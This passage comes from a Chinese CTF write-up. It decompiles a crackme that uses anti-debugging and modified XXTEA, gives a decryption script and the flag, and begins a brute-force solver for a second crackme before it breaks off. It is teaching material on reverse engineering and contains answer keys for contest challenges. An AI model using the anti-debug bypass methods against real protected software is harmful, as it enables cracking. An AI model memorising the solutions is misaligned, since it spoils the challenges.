**envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  _DWORD *v7; <span class="comment">// rdi</span></span><br><span class="line">  HANDLE CurrentProcess; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp-20h] [rbp-458h] BYREF</span></span><br><span class="line">  _DWORD v10[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-438h] BYREF</span></span><br><span class="line">  _BYTE v11[<span class="number">64</span>]; <span class="comment">// [rsp+8h] [rbp-430h] BYREF</span></span><br><span class="line">  _BYTE *v12; <span class="comment">// [rsp+48h] [rbp-3F0h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+64h] [rbp-3D4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [rsp+84h] [rbp-3B4h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v15; <span class="comment">// [rsp+A4h] [rbp-394h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+C4h] [rbp-374h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+E4h] [rbp-354h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> k; <span class="comment">// [rsp+104h] [rbp-334h]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+124h] [rbp-314h]</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [rsp+144h] [rbp-2F4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+164h] [rbp-2D4h]</span></span><br><span class="line">  _DWORD v22[<span class="number">11</span>]; <span class="comment">// [rsp+188h] [rbp-2B0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v23; <span class="comment">// [rsp+1B4h] [rbp-284h]</span></span><br><span class="line">  BOOL v24; <span class="comment">// [rsp+1D4h] [rbp-264h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 j; <span class="comment">// [rsp+1F8h] [rbp-240h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v26; <span class="comment">// [rsp+218h] [rbp-220h]</span></span><br><span class="line">  _DWORD v27[<span class="number">12</span>]; <span class="comment">// [rsp+238h] [rbp-200h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 m; <span class="comment">// [rsp+268h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+3F4h] [rbp-44h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v30; <span class="comment">// [rsp+3F8h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+3FCh] [rbp-3Ch]</span></span><br><span class="line">  __int64 v32; <span class="comment">// [rsp+400h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+408h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v34; <span class="comment">// [rsp+410h] [rbp-28h]</span></span><br><span class="line">  __int64 v35; <span class="comment">// [rsp+428h] [rbp-10h]</span></span><br><span class="line">  __int64 v36; <span class="comment">// [rsp+430h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v36 = v3;</span><br><span class="line">  v35 = v4;</span><br><span class="line">  v7 = v10;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">170</span>; i; --i )</span><br><span class="line">    *v7++ = <span class="number">-858993460</span>;</span><br><span class="line">  v34 = (<span class="type">unsigned</span> __int64)v10 ^ <span class="number">0x1401D9000LL</span>;</span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(<span class="number">0x1401ED104LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v11, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A1190LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">IsDebuggerPresent</span>() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_1400868E3</span>();</span><br><span class="line">    v12 = v11;</span><br><span class="line">    <span class="built_in">memset</span>(v22, <span class="number">0</span>, <span class="number">0x10u</span>);</span><br><span class="line">    v23 = <span class="number">8</span>;</span><br><span class="line">    v29 = <span class="number">8</span>;</span><br><span class="line">    v20 = <span class="number">12</span>;</span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">    v16 = <span class="number">0x61C88646</span>;</span><br><span class="line">    v21 = <span class="number">0x95664B48</span>;</span><br><span class="line">    v19 = <span class="number">7</span>;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    CurrentProcess = <span class="built_in">GetCurrentProcess</span>();</span><br><span class="line">    <span class="built_in">CheckRemoteDebuggerPresent</span>(CurrentProcess, &amp;v24);</span><br><span class="line">    <span class="keyword">if</span> ( !v24 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">j_srand</span>(<span class="number">0xAABBu</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j )</span><br><span class="line">        v22[j] = <span class="built_in">j_rand</span>();</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v29 = v19--;</span><br><span class="line">        v30 = v29 != <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v30 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v15 += v16;</span><br><span class="line">        v17 = (v15 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; v23; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">          v26 = __rdtsc();</span><br><span class="line">          v13 = *(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + <span class="number">1</span>) % v23)];</span><br><span class="line">          v29 = (<span class="number">4</span> * v13) ^ (*(_DWORD *)&amp;v12[<span class="number">4</span> * ((k + v23 - <span class="number">1</span>) % v23)] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">          v30 = k + v23 - <span class="number">1</span>;</span><br><span class="line">          v31 = ((<span class="number">16</span> * *(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)]) ^ (v13 &gt;&gt; <span class="number">3</span>)) + v29;</span><br><span class="line">          v32 = ((<span class="type">unsigned</span> __int8)v17 ^ (<span class="type">unsigned</span> __int8)k) &amp; <span class="number">3</span>;</span><br><span class="line">          v33 = (((*(_DWORD *)&amp;v12[<span class="number">4</span> * (v30 % v23)] ^ v22[v32]) + (v13 ^ v15)) ^ v31) + *(_DWORD *)&amp;v12[<span class="number">4</span> * k];</span><br><span class="line">          *(_DWORD *)&amp;v12[<span class="number">4</span> * k] = v33;</span><br><span class="line">          v14 = v33;</span><br><span class="line">          <span class="keyword">if</span> ( __rdtsc() - v26 &gt; <span class="number">0x83C0</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v27[<span class="number">0</span>] = <span class="number">0xA9934E2F</span>;</span><br><span class="line">      v27[<span class="number">1</span>] = <span class="number">0x30B90FA</span>;</span><br><span class="line">      v27[<span class="number">2</span>] = <span class="number">0xDCBF1D3</span>;</span><br><span class="line">      v27[<span class="number">3</span>] = <span class="number">0x328B5BDE</span>;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">4</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v27[m] != v10[m + <span class="number">2</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11A8LL</span>);</span><br><span class="line">          <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">sub_140087C02</span>(<span class="number">0x1401A11C0LL</span>);</span><br><span class="line">      <span class="built_in">j_system</span>(byte_1401A11A0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_20:</span><br><span class="line">  <span class="built_in">j__RTC_CheckStackVars</span>(&amp;v9, (_RTC_framedesc *)&amp;unk_1401A1140);</span><br><span class="line">  <span class="built_in">j___security_check_cookie</span>((<span class="type">unsigned</span> __int64)v10 ^ v34);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_1401F8E9B</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很清晰看出来是XXTEA加密，密钥是固定种子随机数随机得到的，Delta被魔改，然后密文也能看到。</p>
<p><strong>注：写WP时用的是旧版附件分析，缺失了后面16字节密文</strong></p>
<p>完整密文数据：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line"><span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span></span><br></pre></td></tr></table></figure>

<p>解密代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x61C88646</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y <span class="string">&lt;&lt; 2) + (y &gt;</span>&gt; 3 ^ z &lt;&lt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">                <span class="keyword">if</span> (z == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (y == <span class="number">0xA4F41487</span>)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;11\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">7</span>;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0xAABB</span>);</span><br><span class="line">    <span class="type">uint32_t</span> key[<span class="number">4</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> Enc[]&#123;</span><br><span class="line">        <span class="number">0xa9934e2f</span>, <span class="number">0x30b90fa</span>, <span class="number">0xdcbf1d3</span>, <span class="number">0x328b5bde</span>,</span><br><span class="line">        <span class="number">0x44fab4e</span>, <span class="number">0x1dcf0051</span>, <span class="number">0x85ebbe55</span>, <span class="number">0x93aa773a</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i] = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">xxtea</span>(Enc, <span class="number">-8</span>, key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{th15_15_51mpLe_obf_R19Ht?}</p>
<h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>有反调试，在WinMain开头断点，使用ScyllaHide一把梭去除（（。</p>
<p><img src="/.%5C47.png" loading="lazy"></p>
<p><img src="/.%5C48.png" loading="lazy"></p>
<p>从WinMain可以跟踪到窗口消息函数，图四就是验证函数按钮消息。</p>
<p><img src="/.%5C49.png" loading="lazy"></p>
<p><img src="/.%5C50.png" loading="lazy"></p>
<p><img src="/.%5C51.png" loading="lazy"></p>
<p><img src="/.%5C52.png" loading="lazy"></p>
<p>从TLS那边可以看到启动了一个线程，线程函数如下</p>
<p><img src="/.%5C53.png" loading="lazy"></p>
<p>这边死循环判断了一个值，然后调用CallBack，随便输入flag，点击验证，发现会先调用CallBack中的mark2函数进行第一次验证。</p>
<p><img src="/.%5C54.png" loading="lazy"></p>
<p>将这边v4都异或上0xBB会得到”flag{“五个字符，就明白这边是检测输入flag开头是否为”flag{“，进行了第一次验证，然后继续下一次验证进入了case 5的mark3函数。</p>
<p><img src="/.%5C55.png" loading="lazy"></p>
<p>mark3这边是用固定值生成了一个v5数值列表，a1是输入的字符串，但是可以看到+5跳过了前面的五个字符，然后对括号内的前7个字符做一些加密计算然后和v5列表前7个数值进行检验。</p>
<p>这边就可以直接提取v5生成的数值列表，然后利用爆破得到括号内的前七个字符。</p>
<p><img src="/.%5C56.png" loading="lazy"></p>
<p>爆破代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> box1[] = &#123;</span><br><span class="line">      <span class="number">0x00000000</span>, <span class="number">0xC0BA6CAC</span>, <span class="number">0x5A05DF1B</span>, <span class="number">0x9ABFB3B7</span>, <span class="number">0xB40BBE36</span>, <span class="number">0x74B1D29A</span>,</span><br><span class="line">      <span class="number">0xEE0E612D</span>, <span class="number">0x2EB40D81</span>, <span class="number">0xB3667A2F</span>, <span class="number">0x73DC1683</span>, <span class="number">0xE963A534</span>, <span class="number">0x29D9C998</span>, <span class="number">0x076DC419</span>, <span class="number">0xC7D7A8B5</span>,</span><br><span class="line">      <span class="number">0x5D681B02</span>, <span class="number">0x9DD277AE</span>, <span class="number">0xBDBDF21D</span>, <span class="number">0x7D079EB1</span>, <span class="number">0xE7B82D06</span>, <span class="number">0x270241AA</span>, <span class="number">0x09B64C2B</span>, <span class="number">0xC90C2087</span>,</span><br><span class="line">      <span class="number">0x53B39330</span>, <span class="number">0x9309FF9C</span>, <span class="number">0x0EDB8832</span>, <span class="number">0xCE61E49E</span>, <span class="number">0x54DE5729</span>, <span class="number">0x94643B85</span>, <span class="number">0xBAD03604</span>, <span class="number">0x7A6A5AA8</span>,</span><br><span class="line">      <span class="number">0xE0D5E91F</span>, <span class="number">0x206F85B3</span>, <span class="number">0xA00AE279</span>, <span class="number">0x60B08ED5</span>, <span class="number">0xFA0F3D62</span>, <span class="number">0x3AB551CE</span>, <span class="number">0x14015C4F</span>, <span class="number">0xD4BB30E3</span>,</span><br><span class="line">      <span class="number">0x4E048354</span>, <span class="number">0x8EBEEFF8</span>, <span class="number">0x136C9856</span>, <span class="number">0xD3D6F4FA</span>, <span class="number">0x4969474D</span>, <span class="number">0x89D32BE1</span>, <span class="number">0xA7672660</span>, <span class="number">0x67DD4ACC</span>,</span><br><span class="line">      <span class="number">0xFD62F97B</span>, <span class="number">0x3DD895D7</span>, <span class="number">0x1DB71064</span>, <span class="number">0xDD0D7CC8</span>, <span class="number">0x47B2CF7F</span>, <span class="number">0x8708A3D3</span>, <span class="number">0xA9BCAE52</span>, <span class="number">0x6906C2FE</span>,</span><br><span class="line">      <span class="number">0xF3B97149</span>, <span class="number">0x33031DE5</span>, <span class="number">0xAED16A4B</span>, <span class="number">0x6E6B06E7</span>, <span class="number">0xF4D4B550</span>, <span class="number">0x346ED9FC</span>, <span class="number">0x1ADAD47D</span>, <span class="number">0xDA60B8D1</span>,</span><br><span class="line">      <span class="number">0x40DF0B66</span>, <span class="number">0x806567CA</span>, <span class="number">0x9B64C2B1</span>, <span class="number">0x5BDEAE1D</span>, <span class="number">0xC1611DAA</span>, <span class="number">0x01DB7106</span>, <span class="number">0x2F6F7C87</span>, <span class="number">0xEFD5102B</span>,</span><br><span class="line">      <span class="number">0x756AA39C</span>, <span class="number">0xB5D0CF30</span>, <span class="number">0x2802B89E</span>, <span class="number">0xE8B8D432</span>, <span class="number">0x72076785</span>, <span class="number">0xB2BD0B29</span>, <span class="number">0x9C0906A8</span>, <span class="number">0x5CB36A04</span>,</span><br><span class="line">      <span class="number">0xC60CD9B3</span>, <span class="number">0x06B6B51F</span>, <span class="number">0x26D930AC</span>, <span class="number">0xE6635C00</span>, <span class="number">0x7CDCEFB7</span>, <span class="number">0xBC66831B</span>, <span class="number">0x92D28E9A</span>, <span class="number">0x5268E236</span>,</span><br><span class="line">      <span class="number">0xC8D75181</span>, <span class="number">0x086D3D2D</span>, <span class="number">0x95BF4A83</span>, <span class="number">0x5505262F</span>, <span class="number">0xCFBA9598</span>, <span class="number">0x0F00F934</span>, <span class="number">0x21B4F4B5</span>, <span class="number">0xE10E9819</span>,</span><br><span class="line">      <span class="number">0x7BB12BAE</span>, <span class="number">0xBB0B4702</span>, <span class="number">0x3B6E20C8</span>, <span class="number">0xFBD44C64</span>, <span class="number">0x616BFFD3</span>, <span class="number">0xA1D1937F</span>, <span class="number">0x8F659EFE</span>, <span class="number">0x4FDFF252</span>,</span><br><span class="line">      <span class="number">0xD56041E5</span>, <span class="number">0x15DA2D49</span>, <span class="number">0x88085AE7</span>, <span class="number">0x48B2364B</span>, <span class="number">0xD20D85FC</span>, <span class="number">0x12B7E950</span>, <span class="number">0x3C03E4D1</span>, <span class="number">0xFCB9887D</span>,</span><br><span class="line">      <span class="number">0x66063BCA</span>, <span class="number">0xA6BC5766</span>, <span class="number">0x86D3D2D5</span>, <span class="number">0x4669BE79</span>, <span class="number">0xDCD60DCE</span>, <span class="number">0x1C6C6162</span>, <span class="number">0x32D86CE3</span>, <span class="number">0xF262004F</span>,</span><br><span class="line">      <span class="number">0x68DDB3F8</span>, <span class="number">0xA867DF54</span>, <span class="number">0x35B5A8FA</span>, <span class="number">0xF50FC456</span>, <span class="number">0x6FB077E1</span>, <span class="number">0xAF0A1B4D</span>, <span class="number">0x81BE16CC</span>, <span class="number">0x41047A60</span>,</span><br><span class="line">      <span class="number">0xDBBBC9D7</span>, <span class="number">0x1B01A57B</span>, <span class="number">0xEDB88321</span>, <span class="number">0x2D02EF8D</span>, <span class="number">0xB7BD5C3A</span>, <span class="number">0x77073096</span>, <span class="number">0x59B33D17</span>, <span class="number">0x990951BB</span>,</span><br><span class="line">      <span class="number">0x03B6E20C</span>, <span class="number">0xC30C8EA0</span>, <span class="number">0x5EDEF90E</span>, <span class="number">0x9E6495A2</span>, <span class="number">0x04DB2615</span>, <span class="number">0xC4614AB9</span>, <span class="number">0xEAD54738</span>, <span class="number">0x2A6F2B94</span>,</span><br><span class="line">      <span class="number">0xB0D09823</span>, <span class="number">0x706AF48F</span>, <span class="number">0x5005713C</span>, <span class="number">0x90BF1D90</span>, <span class="number">0x0A00AE27</span>, <span class="number">0xCABAC28B</span>, <span class="number">0xE40ECF0A</span>, <span class="number">0x24B4A3A6</span>,</span><br><span class="line">      <span class="number">0xBE0B1011</span>, <span class="number">0x7EB17CBD</span>, <span class="number">0xE3630B13</span>, <span class="number">0x23D967BF</span>, <span class="number">0xB966D408</span>, <span class="number">0x79DCB8A4</span>, <span class="number">0x5768B525</span>, <span class="number">0x97D2D989</span>,</span><br><span class="line">      <span class="number">0x0D6D6A3E</span>, <span class="number">0xCDD70692</span>, <span class="number">0x4DB26158</span>, <span class="number">0x8D080DF4</span>, <span class="number">0x17B7BE43</span>, <span class="number">0xD70DD2EF</span>, <span class="number">0xF9B9DF6E</span>, <span class="number">0x3903B3C2</span>,</span><br><span class="line">      <span class="number">0xA3BC0075</span>, <span class="number">0x63066CD9</span>, <span class="number">0xFED41B77</span>, <span class="number">0x3E6E77DB</span>, <span class="number">0xA4D1C46C</span>, <span class="number">0x646BA8C0</span>, <span class="number">0x4ADFA541</span>, <span class="number">0x8A65C9ED</span>,</span><br><span class="line">      <span class="number">0x10DA7A5A</span>, <span class="number">0xD06016F6</span>, <span class="number">0xF00F9345</span>, <span class="number">0x30B5FFE9</span>, <span class="number">0xAA0A4C5E</span>, <span class="number">0x6AB020F2</span>, <span class="number">0x44042D73</span>, <span class="number">0x84BE41DF</span>,</span><br><span class="line">      <span class="number">0x1E01F268</span>, <span class="number">0xDEBB9EC4</span>, <span class="number">0x4369E96A</span>, <span class="number">0x83D385C6</span>, <span class="number">0x196C3671</span>, <span class="number">0xD9D65ADD</span>, <span class="number">0xF762575C</span>, <span class="number">0x37D83BF0</span>,</span><br><span class="line">      <span class="number">0xAD678847</span>, <span class="number">0x6DDDE4EB</span>, <span class="number">0x76DC4190</span>, <span class="number">0xB6662D3C</span>, <span class="number">0x2CD99E8B</span>, <span class="number">0xEC63F227</span>, <span class="number">0xC2D7FFA6</span>, <span class="number">0x026D930A</span>,</span><br><span class="line">      <span class="number">0x98D220BD</span>, <span class="number">0x58684C11</span>, <span class="number">0xC5BA3BBF</span>, <span class="number">0x05005713</span>, <span class="number">0x9FBFE4A4</span>, <span class="number">0x5F058808</span>, <span class="number">0x71B18589</span>, <span class="number">0xB10BE925</span>,</span><br><span class="line">      <span class="number">0x2BB45A92</span>, <span class="number">0xEB0E363E</span>, <span class="number">0xCB61B38D</span>, <span class="number">0x0BDBDF21</span>, <span class="number">0x91646C96</span>, <span class="number">0x51DE003A</span>, <span class="number">0x7F6A0DBB</span>, <span class="number">0xBFD06117</span>,</span><br><span class="line">      <span class="number">0x256FD2A0</span>, <span class="number">0xE5D5BE0C</span>, <span class="number">0x7807C9A2</span>, <span class="number">0xB8BDA50E</span>, <span class="number">0x220216B9</span>, <span class="number">0xE2B87A15</span>, <span class="number">0xCC0C7794</span>, <span class="number">0x0CB61B38</span>,</span><br><span class="line">      <span class="number">0x9609A88F</span>, <span class="number">0x56B3C423</span>, <span class="number">0xD6D6A3E9</span>, <span class="number">0x166CCF45</span>, <span class="number">0x8CD37CF2</span>, <span class="number">0x4C69105E</span>, <span class="number">0x62DD1DDF</span>, <span class="number">0xA2677173</span>,</span><br><span class="line">      <span class="number">0x38D8C2C4</span>, <span class="number">0xF862AE68</span>, <span class="number">0x65B0D9C6</span>, <span class="number">0xA50AB56A</span>, <span class="number">0x3FB506DD</span>, <span class="number">0xFF0F6A71</span>, <span class="number">0xD1BB67F0</span>, <span class="number">0x11010B5C</span>,</span><br><span class="line">      <span class="number">0x8BBEB8EB</span>, <span class="number">0x4B04D447</span>, <span class="number">0x6B6B51F4</span>, <span class="number">0xABD13D58</span>, <span class="number">0x316E8EEF</span>, <span class="number">0xF1D4E243</span>, <span class="number">0xDF60EFC2</span>, <span class="number">0x1FDA836E</span>,</span><br><span class="line">      <span class="number">0x856530D9</span>, <span class="number">0x45DF5C75</span>, <span class="number">0xD80D2BDB</span>, <span class="number">0x18B74777</span>, <span class="number">0x8208F4C0</span>, <span class="number">0x42B2986C</span>, <span class="number">0x6C0695ED</span>, <span class="number">0xACBCF941</span>,</span><br><span class="line">      <span class="number">0x36034AF6</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>, <span class="number">0xCCCCCC00</span>, <span class="number">0x00000100</span>, <span class="number">0x00000000</span>, <span class="number">0xF6B9265A</span>, <span class="number">0xCCCCCCCC</span>,</span><br><span class="line">      <span class="number">0x00000008</span>, <span class="number">0x00000000</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> enc1[]&#123;</span><br><span class="line">      <span class="number">0x46A95BAD</span>,</span><br><span class="line">      <span class="number">0x1CAC84B6</span>,</span><br><span class="line">      <span class="number">0xA67CB2B2</span>,</span><br><span class="line">      <span class="number">0x32188937</span>,</span><br><span class="line">      <span class="number">0x4872D39F</span>,</span><br><span class="line">      <span class="number">0xF2A2E59B</span>,</span><br><span class="line">      <span class="number">0x011B94D2</span>,</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 爆破前7字节</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">28</span>; c &lt; <span class="number">132</span>; 